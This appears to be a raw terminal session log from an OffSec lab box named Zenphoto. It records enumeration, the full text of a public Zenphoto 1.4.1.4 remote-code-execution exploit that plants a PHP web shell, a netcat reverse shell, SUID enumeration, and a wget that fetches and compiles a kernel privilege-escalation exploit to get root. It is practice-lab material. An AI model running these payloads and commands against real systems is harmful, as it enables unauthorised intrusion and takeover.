@@ -1,0 +1,403 @@
+
+=== SESSION START: 2026-08-27 14:03:16 | Box: Zenphoto | IP: 192.168.183.41 | Platform: Offsec ===
+
+$ [14:03:21] htblog
+
+=== OUTPUT CAPTURE START: 2026-08-27 14:03:21 ===
+
+$ [14:05:16] sudo nmap -p- --min-rate 10000 -oN allports.nmap $BoxIP
+
+$ [14:07:11] sudo nmap -sV -sC -p 22,23,80,3306 -oN services.nmap $BoxIP
+
+$ [14:11:33] curl -s http://$BoxIP/
+
+$ [14:14:13] gobuster dir -u http://$BoxIP/ -w /usr/share/wordlists/dirb/common.txt -o gobuster-root.txt
+Script started on 2026-08-27 14:03:21+01:00 [COMMAND="zsh -i" TERM="xterm-256color" TTY="/dev/pts/5" COLUMNS="238" LINES="55"]
+[1m[7m%[27m[1m[0m                                                                                                                                                                                                                                              [0m[27m[24m[J[32mkali@kali[39m:[34m~/Platforms/Offsec/Zenphoto[39m [33m[14:03:21][39m $ [K[?1h=[?2004hsudo nmap -p- --min-rate 10000 -oN allports.nmap $BoxIP[55D[4m[32ms[4m[32mu[4m[32md[4m[32mo[24m[39m [32mn[32mm[32ma[32mp[39m[46C[?1l>[?2004l
+[sudo] password for kali: 
+Starting Nmap 7.99 ( https://nmap.org ) at 2026-08-27 14:05 +0100
+Nmap scan report for 192.168.183.41
+Host is up (0.012s latency).
+Not shown: 65531 closed tcp ports (reset)
+PORT     STATE SERVICE
+22/tcp   open  ssh
+23/tcp   open  telnet
+80/tcp   open  http
+3306/tcp open  mysql
+
+Nmap done: 1 IP address (1 host up) scanned in 8.73 seconds
+[1m[7m%[27m[1m[0m                                                                                                                                                                                                                                              [0m[27m[24m[J[32mkali@kali[39m:[34m~/Platforms/Offsec/Zenphoto[39m [33m[14:05:28][39m $ [K[?1h=[?2004hsudo nmap -sV -sC -p 22,23,80,3306 -oN services.nmap $BoxIP[59D[4m[32ms[4m[32mu[4m[32md[4m[32mo[24m[39m [32mn[32mm[32ma[32mp[39m[50C[?1l>[?2004l
+Starting Nmap 7.99 ( https://nmap.org ) at 2026-08-27 14:07 +0100
+Nmap scan report for 192.168.183.41
+Host is up (0.013s latency).
+
+PORT     STATE SERVICE VERSION
+22/tcp   open  ssh     OpenSSH 5.3p1 Debian 3ubuntu7 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   1024 83:92:ab:f2:b7:6e:27:08:7b:a9:b8:72:32:8c:cc:29 (DSA)
+|_  2048 65:77:fa:50:fd:4d:9e:f1:67:e5:cc:0c:c6:96:f2:3e (RSA)
+23/tcp   open  ipp     CUPS 1.4
+|_http-title: 403 Forbidden
+|_http-server-header: CUPS/1.4
+| http-methods: 
+|_  Potentially risky methods: PUT
+80/tcp   open  http    Apache httpd 2.2.14 ((Ubuntu))
+|_http-server-header: Apache/2.2.14 (Ubuntu)
+|_http-title: Site doesn't have a title (text/html).
+3306/tcp open  mysql   MySQL (unauthorized)
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 38.18 seconds
+[1m[7m%[27m[1m[0m                                                                                                                                                                                                                                              [0m[27m[24m[J[32mkali@kali[39m:[34m~/Platforms/Offsec/Zenphoto[39m [33m[14:07:49][39m $ [K[?1h=[?2004hcurl -s http://$BoxIP/[22D[32mc[32mu[32mr[32ml[39m[18C[?1l>[?2004l
+<html><body><center>
+<pre>UNDER CONTRUCTION</pre>
+</center>
+</body></html>
+[1m[7m%[27m[1m[0m                                                                                                                                                                                                                                              [0m[27m[24m[J[32mkali@kali[39m:[34m~/Platforms/Offsec/Zenphoto[39m [33m[14:11:33][39m $ [K[?1h=[?2004hgobuster dir -u http://$BoxIP/ -w /usr/share/wordlists/dirb/common.txt -o gobuster-root.txt[91D[32mg[32mo[32mb[32mu[32ms[32mt[32me[32mr[39m[26C[4m/[4mu[4ms[4mr[4m/[4ms[4mh[4ma[4mr[4me[4m/[4mw[4mo[4mr[4md[4ml[4mi[4ms[4mt[4ms[4m/[4md[4mi[4mr[4mb[4m/[4mc[4mo[4mm[4mm[4mo[4mn[4m.[4mt[4mx[4mt[24m[21C[?1l>[?2004l
+===============================================================
+Gobuster v3.8.2
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://192.168.183.41/
+[
+$ [14:16:15] curl -s http://$BoxIP/test/ | head -50
++] Method:                  GET
+[+] Threads:                 10
+[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.8.2
+[+] Timeout:                 10s
+===============================================================
+Starting gobuster in directory enumeration mode
+===============================================================
+[2K.hta                [33m (Status: 403)[0m [Size: 286]
+[2K.htaccess           [33m (Status: 403)[0m [Size: 291]
+[2K.htpasswd           [33m (Status: 403)[0m [Size: 291]
+[2KProgress: 380 / 4613 (8.24%)[2Kcgi-bin/            [33m (Status: 403)[0m [Size: 290]
+[2KProgress: 847 / 4613 (18.36%)[2KProgress: 1216 / 4613 (26.36%)[2KProgress: 1645 / 4613 (35.66%)[2Kindex               [32m (Status: 200)[0m [Size: 75]
+[2Kindex.html          [32m (Status: 200)[0m [Size: 75]
+[2KProgress: 2079 / 4613 (45.07%)[2KProgress: 2547 / 4613 (55.21%)[2KProgress: 2935 / 4613 (63.62%)[2KProgress: 3370 / 4613 (73.05%)[2KProgress: 3831 / 4613 (83.05%)[2Ktest                [36m (Status: 301)[0m [Size: 315][34m [--> http://192.168.183.41/test/][0m
+[2KProgress: 4246 / 4613 (92.04%)[2KProgress: 4612 / 4613 (99.98%)[2KProgress: 4612 / 4613 (99.98%)[2KProgress: 4612 / 4613 (99.98%)[2KProgress: 4612 / 4613 (99.98%)[2KProgress: 4612 / 4613 (99.98%)[2KProgress: 4612 / 4613 (99.98%)[2KProgress: 4612 / 4613 (99.98%)[2KProgress: 4612 / 4613 (99.98%)[2Kserver-status       [33m (Status: 403)[0m [Size: 295]
+[2KProgress: 4613 / 4613 (100.00%)[2KProgress: 4613 / 4613 (100.00%)
+===============================================================
+Finished
+===============================================================
+[1m[7m%[27m[1m[0m                                                                                                                                                                                                                                              [0m[27m[24m[J[32mkali@kali[39m:[34m~/Platforms/Offsec/Zenphoto[39m [33m[14:14:23][39m $ [K[?1h=[?2004hcurl -s http://$BoxIP/test/ | head -50[38D[32mc[32mu[32mr[32ml[39m[26C[32mh[32me[32ma[32md[39m[4C[?1l>[?2004l
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+		<script type="text/javascript" src="/test/zp-core/js/jquery.js"></script>
+	<script type="text/javascript" src="/test/zp-core/js/zenphoto.js"></script>
+	<script type="text/javascript">
+		// <!-- <![CDATA[
+		var deleteAlbum1 = "Are you sure you want to delete this entire album?";
+		var deleteAlbum2 = "Are you Absolutely Positively sure you want to delete the album? THIS CANNOT BE UNDONE!";
+		var deleteImage = "Are you sure you want to delete the image? THIS CANNOT BE UNDONE!";
+		var deleteArticle = "Are you sure you want to delete this article? THIS CANNOT BE UNDONE!";
+		var deletePage = "Are you sure you want to delete this page? THIS CANNOT BE UNDONE!";
+		// ]]> -->
+		</script>
+			<title>Gallery</title>
+	<meta http-equiv="content-type" content="text/html; charset=UTF-8" />
+	<link rel="stylesheet" href="/test/themes/default/styles/light.css" type="text/css" />
+	<link rel="alternate" type="application/rss+xml" title="Gallery RSS" href="http://192.168.183.41/test/index.php?rss&amp;lang=" />
+</head>
+
+<body>
+
+<div id="main">
+
+	<div id="gallerytitle">
+				<script type="text/javascript" src="/test/zp-core/js/admin.js"></script>
+			<div id="search"><!-- search form -->
+
+		<form method="post" action="/test/index.php?p=search" id="search_form">
+			<script type="text/javascript">
+				// <!-- <![CDATA[
+				function reset_search() {
+					lastsearch='';
+					$('#reset_search').hide();
+					$('#search_submit').attr('title', 'Search');
+					$('#search_input').val('');
+				}
+				var lastsearch = '';
+				var savedlastsearch = lastsearch;
+				$('#search_form').subm
+$ [14:16:38] curl -s http://$BoxIP/test/ | grep -i "zenphoto\|version"
+
+$ [14:17:51] searchsploit zenphoto
+it(function(){
+					if (lastsearch) {
+						var newsearch = $.trim($('#search_input').val());
+						if (newsearch.substring(newsearch.length - 1)==',') {
+							newsearch = newsearch.substr(0,newsearch.length-1);
+						}
+						if (newsearch.length > 0) {
+							$('#search_input').val('('+lastsearch+') AND ('+newsearch+')');
+						} else {
+							$('#search_input').val(lastsearch);
+						}
+[1m[7m%[27m[1m[0m                                                                                                                                                                                                                                              [0m[27m[24m[J[32mkali@kali[39m:[34m~/Platforms/Offsec/Zenphoto[39m [33m[14:16:15][39m $ [K[?1h=[?2004hcurl -s http://$BoxIP/test/ | grep -i "zenphoto\|version"[57D[32mc[32mu[32mr[32ml[39m[26C[32mg[32mr[32me[32mp[39m[4C[33m"[33mz[33me[33mn[33mp[33mh[33mo[33mt[33mo[33m\[33m|[33mv[33me[33mr[33ms[33mi[33mo[33mn[33m"[39m[?1l>[?2004l
+	<script type="text/javascript" src="/test/zp-core/js/zenphoto.js"></script>
+Powered by <a href="http://www.zenphoto.org" title="A simpler web album"><span id="zen-part">zen</span><span id="photo-part">PHOTO</span></a></div>
+<!-- zenphoto version 1.4.1.4 [8157] (Official Build) THEME: default (index.php) GRAPHICS LIB: PHP GD library 2.0 { memory: 128M } PLUGINS: class-video colorbox deprecated-functions hitcounter security-logger tiny_mce zenphoto_news zenphoto_sendmail zenphoto_seo  -->
+<!-- Zenphoto script processing end:0.0428 seconds -->
+[1m[7m%[27m[1m[0m                                                                                                                                                                                                                                              [0m[27m[24m[J[32mkali@kali[39m:[34m~/Platforms/Offsec/Zenphoto[39m [33m[14:16:38][39m $ [K[?1h=[?2004hsearchsploit zenphoto[21D[32ms[32me[32ma[32mr[32mc[32mh[32ms[32mp[32ml[32mo[32mi[32mt[39m[9C[?1l>[?2004l
+------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
+ Exploit Title                                                                                                                                                                                              |  Path
+------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
+[01;31m[KZenPhoto[m[K - 'admin-news-articles.php' Cross-Site Scripting                                                                                                                                                   | php/webapps/37903.txt
+[01;31m[KZenPhoto[m[K - 'index.php' SQL Injection                                                                                                                                                                        | php/webapps/38326.txt
+[01;31m[KZenPhoto[m[K - Config Update / Command Execution                                                                                                                                                                | php/webapps/15114.php
+[01;31m[KZenPhoto[m[K - SQL Injection                                                                                                                                                                                    | php/webapps/39062.txt
+[01;31m[KZenPhoto[m[K 0.9/1.0 - 'i.php?a' Cross-Site Scripting                                                                                                                                                           | php/webapps/27795.txt
+[01;31m[KZenPhoto[m[K 0.9/1.0 - 'index.php' Multiple Cross-Site Scripting Vulnerabilities                                                                                                                                | php/webapps/27796.txt
+[01;31m[KZenPhoto[m[K 1.1.3 - 'rss.php?albumnr' SQL Injection                                                                                                                                                            | php/webapps/4823.pl
+[01;31m[KZenPhoto[m[K 1.2.5 - Completely Blind SQL Injection                                                                                                                                                             | php/webapps/9154.js
+[01;31m[KZenPhoto[m[K 1.3 - '/zp-core/admin.php' Multiple Cross-Site Scripting Vulnerabilities                                                                                                                           | php/webapps/34611.txt
+[01;31m[KZenPhoto[m[K 1.3 - '/zp-core/full-image.php?a' SQL Injection                                                                                                                                                    | php/webapps/34610.txt
+[01;31m[KZenPhoto[m[K 1.4.0.3 - '_zp_themeroot' Multiple Cross-Site Scripting Vulnerabilities                                                                                                                            | php/webapps/35648.txt
+[01;31m[KZenPhoto[m[K 1.4.0.3 - x-forwarded-for HTTP Header Persistent Cross-Site Scripting                                                                                                                              | php/webapps/17200.txt
+[01;31m[KZenPhoto[m[K 1.4.1.4 - 'ajax_create_folder.php' Remote Code Execution                                                                                                                                           | php/webapps/18083.php
+[01;31m[KZenPhoto[m[K 1.4.10 - Local File Inclusion                                                                                                                                                                      | php/webapps/38841.txt
+[01;31m[KZenPhoto[m[K 1.4.11 - Remote File Inclusion                                                                                                                                                                     | php/webapps/39571.txt
+[01;31m[KZenPhoto[m[K 1.4.3.3 - Multiple Vulnerabilities                                                                                                                                                                 | php/webapps/22524.txt
+[01;31m[KZenPhoto[m[K 1.4.8 - Multiple Vulnerabilities                                                                                                                                                                   | php/webapps/37602.txt
+[01;31m[KZenphoto[m[K 1.6 - Multiple stored XSS                                                                                                                                                                          | php/webapps/51485.txt
+[01;31m[KZenPhoto[m[K CMS 1.3 - Multiple Cross-Site Request Forgery Vulnerabilities                                                                                                                                      | php/webapps/14359.html
+[01;31m[KZenPhoto[m[K Gallery 1.2.5 - Admin Password Reset (Cross-Site Request Forgery)                                                                                                                                  | php/webapps/9166.txt
+------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
+Shellcodes: No Results
+[1m[7m%[27m[1m[0m                                                                                                                                                                                                 
+$ [14:19:05] cp /usr/share/exploitdb/exploits/php/webapps/18083.php exploits/
+
+$ [14:19:11] cat exploits/18083.php
+                                             [0m[27m[24m[J[32mkali@kali[39m:[34m~/Platforms/Offsec/Zenphoto[39m [33m[14:17:51][39m $ [K[?1h=[?2004hcp /usr/share/exploitdb/exploits/php/webapps/18083.php exploits/[64D[32mc[32mp[39m [4m/[4mu[4ms[4mr[4m/[4ms[4mh[4ma[4mr[4me[4m/[4me[4mx[4mp[4ml[4mo[4mi[4mt[4md[4mb[4m/[4me[4mx[4mp[4ml[4mo[4mi[4mt[4ms[4m/[4mp[4mh[4mp[4m/[4mw[4me[4mb[4ma[4mp[4mp[4ms[4m/[4m1[4m8[4m0[4m8[4m3[4m.[4mp[4mh[4mp[24m [4me[4mx[4mp[4ml[4mo[4mi[4mt[4ms[4m/[24m[?1l>[?2004l
+[1m[7m%[27m[1m[0m                                                                                                                                                                                                                                              [0m[27m[24m[J[32mkali@kali[39m:[34m~/Platforms/Offsec/Zenphoto[39m [33m[14:19:05][39m $ [K[?1h=[?2004hcat exploits/18083.php[22D[32mc[32ma[32mt[39m [4me[4mx[4mp[4ml[4mo[4mi[4mt[4ms[4m/[4m1[4m8[4m0[4m8[4m3[4m.[4mp[4mh[4mp[24m[?1l>[?2004l
+<?php
+
+/*
+    --------------------------------------------------------------------------
+    Zenphoto <= 1.4.1.4 (ajax_create_folder.php) Remote Code Execution Exploit
+    --------------------------------------------------------------------------
+
+    author............: Egidio Romano aka EgiX
+    mail..............: n0b0d13s[at]gmail[dot]com
+    software link.....: http://www.zenphoto.org/
+
+    +-------------------------------------------------------------------------+
+    | This proof of concept code was written for educational purpose only.    |
+    | Use it at your own risk. Author will be not responsible for any damage. |
+    +-------------------------------------------------------------------------+
+
+    [-] Vulnerability overview:
+
+    All versions of Zenphoto from 1.2.4 to 1.4.1.4 are affected by the
+    vulnerability that I reported to http://www.exploit-db.com/exploits/18075/
+
+    [-] Disclosure timeline:
+
+    [21/10/2011] - Vulnerability discovered
+    [24/10/2011] - Issue reported to http://www.zenphoto.org/trac/ticket/2005
+    [31/10/2011] - Fix released with version 1.4.1.5
+    [05/11/2011] - Public disclosure
+
+*/
+
+error_reporting(0);
+set_time_limit(0);
+ini_set("default_socket_timeout", 5);
+
+function http_send($host, $packet)
+{
+    if (!($sock = fsockopen($host, 80)))
+        die( "\n[-] No response from {$host}:80\n");
+
+    fwrite($sock, $packet);
+    return stream_get_contents($sock);
+}
+
+print "\n+-----------------------------------------------------------+";
+print "\n| Zenphoto <= 1.4.1.4 Remote Code Execution Exploit by EgiX |";
+print "\n+-----------------------------------------------------------+\n";
+
+if ($argc < 3)
+{
+    print "\nUsage......: php $argv[0] <host> <path>\n";
+    print "\nExample....: php $argv[0] localhost /";
+    print "\nExample....: php $argv[0] localhost /zenphoto/\n";
+    die();
+}
+
+$host = $argv[1];
+$path = $argv[2];
+
+$payload = "foo=<?php error_reporting(0);print(_code_);passthru(base64_decode(\$_SERVER[HTTP_CMD]));die; ?>";
+$packet  = "POST {$path}zp-core/zp-extensions/tiny_mce/plugins/ajaxfilemanager/ajax_create_folder.php HTTP/1.0\r\n";
+$packet .= "Host: {$host}\r\n";
+$packet .= "Content-Length: ".strlen($payload)."\r\n";
+$packet .= "Content-Type: application/x-www-form-urlencoded\r\n";
+$packet .= "Connection: close\r\n\r\n{$payload}";
+
+http_send($host, $packet);
+
+$packet  = "GET {$path}zp-core/zp-extensions/tiny_mce/plugins/ajaxfilemanager/inc/data.php HTTP/1.0\r\n";
+$packet .= "Host: {$host}\r\n";
+$packet .= "Cmd: %s\r\n";
+$packet .= "Connection: close\r\n\r\n";
+
+while(1)
+{
+    print "\nzenphoto-shell# ";
+    if (($cmd = trim(fgets(STDIN))) == "exit") break;
+    preg_match("/_code_(.*)/s", http_send($host, sprintf($packet, base64_encode($cmd))), $m) ?
+    print $m[1] : die("\n[-] Exploit failed!\n");
+}
+
+?>[1m[7m%[27m[1m[0m                                                                     
+=== SESSION RECONNECT: 2026-08-27 14:20:21 ===
+
+$ [14:20:25] htblog
+
+=== OUTPUT CAPTURE START: 2026-08-27 14:20:25 ===
+
+$ [14:20:33] sudo nc -lvnp 80
+
+=== SESSION RECONNECT: 2026-08-27 14:20:55 ===
+
+$ [14:20:58] htblog
+
+=== OUTPUT CAPTURE START: 2026-08-27 14:20:58 ===
+
+$ [14:21:01] php exploits/18083.php $BoxIP /test/
+
+$ [14:23:38] stty raw -echo; fg
+
+$ [14:26:38] loot flag user 2ecf27224d18bd4c6935f777838ba5c1
+
+$ [14:31:19] searchsploit 2.6.32
+
+$ [14:31:43] searchsploit rds kernel
+                                                                                                                                                                         [0m[27m[24m[J[32mkali@kali[39m:[34m~/Platforms/Offsec/Zenphoto[39m [33m[14:19:11][39m $ [K[?1h=[?2004h[0m[27m[24m[J[32mkali@kali[39m:[34m~/Platforms/Offsec/Zenphoto[39m [33m[14:20:20][39m $ loot flag user 2ecf27224d18bd4c6935f777838ba5c1[47D[32ml[32mo[32mo[32mt[39m[43C[?1l>[?2004l
+[+] Flag saved:  user = 2ecf27224d18bd4c6935f777838ba5c1  →  loot/flags.txt
+[1m[7m%[27m[1m[0m                                                                                                                      [0m[27m[24m[J[32mkali@kali[39m:[34m~/Platforms/Offsec/Zenphoto[39m [33m[14:26:38][39m $ [K[?1h=[?2004hsearchsploit 2.6.32[19D[32ms[32me[32ma[32mr[32mc[32mh[32ms[32mp[32ml[32mo[32mi[32mt[39m[7C[?1l>[?2004l
+------------------------------------------------------------------------------------ ---------------------------------
+ Exploit Title                                                                      |  Path
+------------------------------------------------------------------------------------ ---------------------------------
+Linux Kernel 2.4.1 < 2.4.37 / 2.6.1 < [01;31m[K2.6.32[m[K-rc5 - 'pipe.c' Local Privilege Escalat | linux/local/9844.py
+Linux Kernel [01;31m[K2.6.32[m[K (Ubuntu 10.04) - '/proc' Handling SUID Privilege Escalation     | linux/local/41770.txt
+Linux Kernel [01;31m[K2.6.32[m[K - 'pipe.c' Local Privilege Escalation (4)                       | linux/local/10018.sh
+Linux Kernel [01;31m[K2.6.32[m[K < 3.x (CentOS 5/6) - 'PERF_EVENTS' Local Privilege Escalation ( | linux/local/25444.c
+Linux Kernel [01;31m[K2.6.32[m[K-5 (Debian 6.0.5) - '/dev/ptmx' Key Stroke Timing Local Disclosu | linux/local/24459.sh
+Linux Kernel [01;31m[K2.6.32[m[K-642/3.16.0-4 - 'inode' Integer Overflow                         | linux/dos/40819.c
+Linux Kernel [01;31m[K2.6.32[m[K-rc1 (x86-64) - Register Leak                                    | linux_x86-64/local/40811.c
+Linux Kernel < 2.6.36-rc1 (Ubuntu 10.04 / [01;31m[K2.6.32[m[K) - 'CAN BCM' Local Privilege Escal | linux/local/14814.c
+------------------------------------------------------------------------------------ ---------------------------------
+Shellcodes: No Results
+[1m[7m%[27m[1m[0m                                                                                                                      [0m[27m[24m[J[32mkali@kali[39m:[34m~/Platforms/Offsec/Zenphoto[39m [33m[14:31:19][39m $ [K[?1h=[?2004hsearchsploit rds kernel[23D[32ms[32me[32ma[32mr[32mc[32mh[32ms[32mp[32ml[32mo[32mi[32mt[39m[11C[?1l>[?2004l
+------------------------------------------------------------------------------------ ---------------------------------
+ Exploit Title                                                                      |  Path
+------------------------------------------------------------------------------------ ---------------------------------
+Linux [01;31m[KKernel[m[K 2.6.36-rc8 - '[01;31m[KRDS[m[K Protocol' Local Privilege Escalation                 | linux/local/15285.c
+Linux [01;31m[KKernel[m[K 2.6.x - '[01;31m[Krds[m[K_recvmsg()' Local Information Disclosure                   | linux/local/37543.c
+SPIP < 2.0.9 - Arbitrary Copy All Passwo[01;31m[Krds[m[K to '.XML' File                          | php/webapps/9448.py
+------------------------------------------------------------------------------------ ---------------------------------
+Shellcodes: No Results
+[1m[7m%[27m[1m[0m                                                                                                                      [0m[27m[24m[J[32mkali@kali[39m:[34m~/Platforms/Offsec/Zenphoto[39m [33m[14:31:43][39m $ [K[?1h=[?2004hcp /usr/share/exploitdb/exploits/linux/local/15285.c exploits/[62D[32mc[32mp[39m [4m/[4mu[4ms[4mr[4m/[4ms[4mh[4ma[4mr[4me
+$ [14:33:54] cp /usr/share/exploitdb/exploits/linux/local/15285.c exploits/
+
+$ [14:34:41] cd /home/kali/Platforms/Offsec/Zenphoto && python3 -m http.server 8000
+Script started on 2026-08-27 14:20:25+01:00 [COMMAND="zsh -i" TERM="xterm-256color" TTY="/dev/pts/7" COLUMNS="117" LINES="55"]
+[1m[7m%[27m[1m[0m                                                                                                                     [0m[27m[24m[J[32mkali@kali[39m:[34m~/Platforms/Offsec/Zenphoto[39m [33m[14:20:25][39m $ [K[?1h=[?2004hsudo nc -lvnp 80[16D[4m[32ms[4m[32mu[4m[32md[4m[32mo[24m[39m [32mn[32mc[39m[9C[?1l>[?2004l
+[sudo] password for kali: 
+Listening on 0.0.0.0 80
+Connection received on 192.168.183.41 34550
+bash: no job control in this shell
+<p-extensions/tiny_mce/plugins/ajaxfilemanager/inc$ python -c 'import pty; pty.spawn("/bin/bash")'
+python -c 'import pty; pt<ins/ajaxfilemanager/inc$ python -c 'import pty; pty                         .spawn("/bin/bash")'
+<p-extensions/tiny_mce/plugins/ajaxfilemanager/inc$ ^Z
+zsh: suspended  sudo nc -lvnp 80
+[1m[7m%[27m[1m[0m                                                                                                                     [0m[27m[24m[J[32mkali@kali[39m:[34m~/Platforms/Offsec/Zenphoto[39m [33m[14:23:32][39m $ [K[?1h=[?2004hstty raw -echo; fg[18D[32ms[32mt[32mt[32my[39m[12C[32mf[32mg[39m[?1l>[?2004l
+[1]  + continued  sudo nc -lvnp 80
+
+<p-extensions/tiny_mce/plugins/ajaxfilemanager/inc$ export TERM=xterm
+www-data@offsecsrv:/var/www/test/zp-core/zp-extensions/tiny_mce/plugins/ajaxfilemmanager/inc$ whoami
+www-data
+www-data@offsecsrv:/var/www/test/zp-core/zp-extensions/tiny_mce/plugins/ajaxfilemmanager/inc$ ls
+class.auth.php	   class.pagination.php     config.base.php
+class.file.php	   class.search.php	    config.php
+class.history.php  class.session.php	    config.tinymce.php
+class.image.php    class.sessionaction.php  data.php
+class.manager.php  class.upload.php	    function.base.php
+www-data@offsecsrv:/var/www/test/zp-core/zp-extensions/tiny_mce/plugins/ajaxfilemmanager/inc$ cd /home
+www-data@offsecsrv:/home$ ls
+local.txt
+www-data@offsecsrv:/home$ cat local.txt
+2ecf27224d18bd4c6935f777838ba5c1
+www-data@offsecsrv:/home$ uname -a
+Linux offsecsrv 2.6.32-21-generic #32-Ubuntu SMP Fri Apr 16 08:10:02 UTC 2010 i686 GNU/Linux
+www-data@offsecsrv:/home$ find / -perm -4000 -type f 2>/dev/null
+/bin/ping6
+/bin/umount
+/bin/mount
+/bin/fusermount
+/bin/su
+/bin/ping
+/lib/dbus-1.0/dbus-daemon-launch-helper
+/usr/bin/sudo
+/usr/bin/gpasswd
+/usr/bin/lppasswd
+/usr/bin/chfn
+/usr/bin/mtr
+/usr/bin/X
+/usr/bin/sudoedit
+/usr/bin/newgrp
+/usr/bin/passwd
+/usr/bin/arping
+/usr/bin/at
+/usr/bin/chsh
+/usr/bin/traceroute6.iputils
+/usr/bin/pkexec
+/usr/lib/eject/dmcrypt-get-device
+/usr/lib/vmware-tools/bin32/vmware-user-suid-wrapper
+/usr/lib/vmware-tools/bin64/vmware-user-suid-wrapper
+/usr/lib/policykit-1/polkit-agent-helper-1
+/usr/lib/openssh/ssh-keysign
+/usr/lib/pt_chown
+/usr/sbin/pppd
+/usr/sbin/uuidd
+www-data@offsecsrv:/home$ sudo -l
+[sudo] password for www-data: 
+Sorry, try again.
+[sudo] password for www-data: 
+Sorry, try again.
+[sudo] password for www-data: 
+Sorry, try again.
+sudo: 3 incorrect password attempts
+www-data@offsecsrv:/home$ uname -a && cat /etc/issue
+Linux offsecsrv 2.6.32-21-generic #32-Ubuntu SMP Fri Apr 16 08:10:02 UTC 2010 i686 GNU/Linux
+Ubuntu 10.04.3 LTS \n \l
+
+www-data@offsecsrv:/home$ searchsploit 2.6.32
+searchsploit: command not found
+www-data@offsecsrv:/home$ cd /tmp && wget http://192.168.45.194:8000/exploits/15 285.c -O 15285.c && gcc 15285.c -o rds
+--2026-08-27 13:34:58--  http://192.168.45.194:8000/exploits/15285.c
+Connecting to 192.168.45.194:8000... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 6860 (6.7K) [text/x-csrc]
+Saving to: `15285.c'
+
+ 0% [                                       ] 0           --.-K/s              100%[======================================>] 6,860       --.-K/s   in 0.01s   
+
+2026-08-27 13:34:58 (531 KB/s) - `15285.c' saved [6860/6860]
+
+www-data@offsecsrv:/tmp$ gcc 15285.c -o rds
+www-data@offsecsrv:/tmp$ ./rd
+$ [14:37:27] loot flag root f62f2823d4c36b7098f3aca7bc275032
+
+$ [14:37:34] proof linux
+
+$ [14:41:35] loot flag user 2ecf27224d18bd4c6935f777838ba5c1
+
+$ [14:43:48] cp ~/Platforms/Offsec/Zenphoto/Zenphoto.log ~/Documents/Obsidian/main-vault/OSCP/BOXES/BOX\ LOGS/Zenphoto.log
